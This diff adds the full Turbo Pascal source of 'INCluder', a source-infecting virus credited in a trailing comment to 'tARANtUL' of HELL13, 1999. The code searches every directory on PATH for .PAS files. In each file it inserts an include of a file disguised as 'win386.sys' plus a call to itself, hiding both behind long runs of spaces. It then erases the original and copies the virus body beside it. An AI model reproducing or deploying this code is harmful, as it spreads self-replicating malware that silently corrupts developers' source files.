@@ -1,0 +1,204 @@
+   procedure INCluder;
+   const
+       glb : byte = 1;
+   var
+    f1, f2, ft : text;
+         D : Dirstr;
+         N : Namestr;
+         E : Extstr;
+       Env : string;
+       str : string;
+   TMPname : string;
+         t : string;
+
+   function RandName : string;
+   var
+      num, i : byte;
+        name : string;
+   begin
+    Randomize;
+    num:=Random(5)+1;
+    name:='inc';
+    for i:=1 to num do name:=name+chr(97+Random(26));
+    name:=name+'.';
+    num:=Random(4)+1;
+    for i:=1 to num do name:=name+chr(97+Random(26));
+    RandName:=name;
+   end;
+
+   procedure WriteInc;
+   var i : byte;
+   begin
+    for i:=1 to 82 do write(ft,' ');
+    writeln(ft,'{I} {$I win386.sys}');
+   end;
+
+   procedure WriteRun;
+   var i : byte;
+   begin
+    for i:=1 to 82 do write(ft,' ');
+    writeln(ft,'INCluder;'#13#10'end.');
+   end;
+
+   procedure COP;
+   var ts, tt : text;
+       c : char;
+   begin
+    assign(ts,D+'win386.sys');
+    assign(tt,t+'/win386.sys');
+    reset(ts);
+    rewrite(tt);
+    while not EOF(ts) do
+    begin
+     read(ts,c);
+     write(tt,c);
+    end;
+    close(ts);
+    close(tt);
+   end;
+
+   procedure Make(s : string);
+   label Uge;
+   var c : char;
+   begin
+    if (s=D+N+E) or (s=N+E) then exit;
+    TMPname:=RandName;
+    assign(f2,s);
+    assign(ft,TMPname);
+    reset(f2);
+    rewrite(ft);
+    readln(f2,str);
+    if (Pos('program',str)<>0) or (Pos('Program',str)<>0)
+       or (Pos('PROGRAM',str)<>0) then
+       begin
+        writeln(ft,str);
+        readln(f2,str);
+       end;
+    if (Pos('uses',str)<>0) or (Pos('Uses',str)<>0)
+       or (Pos('USES',str)<>0) then readln(f2,str);
+    writeln(ft,'uses Dos;');
+    repeat
+    if (Pos('{I}',str)=0) and (Pos('procedure',str)=0) and
+       (Pos('Procedure',str)=0) and (Pos('PROCEDURE',str)=0)
+       and (Pos('function',str)=0) and (Pos('FUNCTION',str)=0)
+       and (Pos('Function',str)=0) and (Pos('begin',str)=0)
+       and (Pos('Begin',str)=0) and (Pos('BEGIN',str)=0) then writeln(ft,str)
+    else
+    begin
+    if Pos('{I}',str)<>0 then goto Uge;
+    if str<>'' then
+     begin
+      if Pos('function',str)<>0 then
+       begin
+        write(ft,Copy(str,1,Pos('function',str)-1));
+        WriteInc;
+        writeln(ft,Copy(str,Pos('function',str),length(str)));
+       end;
+      if Pos('procedure',str)<>0 then
+       begin
+        write(ft,Copy(str,1,Pos('procedure',str)-1));
+        WriteInc;
+        writeln(ft,Copy(str,Pos('procedure',str),length(str)));
+       end;
+      if ((Pos('begin',str)<>0) or (Pos('Begin',str)<>0) or (Pos('BEGIN',str)<>0)) then
+       begin
+        write(ft,Copy(str,1,Pos('begin',str)-1));
+        WriteInc;
+        writeln(ft,Copy(str,Pos('begin',str),length(str)));
+       end;
+      break;
+     end;
+    end;
+    if EOLn(f2) then begin readln(f2); writeln(ft); end;
+    readln(f2,str);
+    until (EOF(f2)) or (str='');
+    readln(f2,str);
+    while ((not EOF(f2)) and (Pos('end.',str)=0) and (Pos('End.',str)=0) and (Pos('END.',str)=0)) do
+     begin
+      writeln(ft,str);
+      if EOLn(f2) then begin readln(f2); writeln(ft); end;
+      readln(f2,str);
+     end;
+    WriteRun;
+    close(ft);
+    close(f2);
+    erase(f2);
+    rename(ft,s);
+    COP;
+    exit;
+   Uge:
+    close(f2);
+    close(ft);
+    erase(ft);
+   end;
+
+   function GetP : string;
+   var
+        i : byte;
+      tmp : string;
+   begin
+    i:=glb; tmp:='';
+    while (i<=length(Env)) and (Env[i]<>';') do
+    begin
+     tmp:=tmp+Env[i];
+     inc(i);
+    end;
+    glb:=i+1;
+    if tmp='' then GetP:='' else GetP:=tmp+'\';
+   end;
+
+   procedure Start;
+   var
+      found : SearchRec;
+   begin
+    Env:=GetEnv('path');
+    repeat
+     t:=GetP;
+     FindFirst(t+'*.PAS',$3F,found);
+     while DosError=0 do
+     begin
+      Make(t+found.name);
+      FindNext(found);
+     end;
+    until t='';
+   end;
+
+   begin
+    FSplit(ParamStr(0),D,N,E);
+    assign(f1,D+N+'.PAS');
+    Start;
+   end;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                      {
+                              Name: INCluder [fixed]
+                              Type: HLLP, for Pascal sources
+                              Date: 28.02.99
+                            RealSz: No size - No wise (c)
+                            CompSz: -
+                            Author: tARANtUL
+                             Group: HELL13
+                              Info: Almost dead sources =)
+                                                                                                      }
